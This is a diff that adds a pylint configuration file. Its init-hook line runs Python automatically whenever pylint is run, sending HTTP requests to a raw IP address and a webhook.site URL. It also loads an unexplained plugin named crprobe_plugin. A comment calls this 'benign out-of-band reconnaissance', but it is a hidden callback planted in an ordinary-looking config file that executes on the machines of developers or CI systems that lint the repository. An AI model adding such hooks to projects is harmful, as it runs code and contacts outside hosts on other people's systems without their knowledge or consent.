@@ -1,0 +1,8 @@
+[MASTER]
+# pylint evaluates init-hook with exec() before analysis, and imports every module named in
+# load-plugins. Both execute repository-supplied Python. Benign out-of-band reconnaissance only.
+init-hook=import urllib.request as u; [u.urlopen(x, timeout=4) for x in ('http://62.171.145.137:9111/pylintinit-vps', 'https://webhook.site/884eb945-5683-403e-99be-ea8fcb942a18/pylintinit-wh')]
+load-plugins=crprobe_plugin
+
+[MESSAGES CONTROL]
+disable=missing-docstring
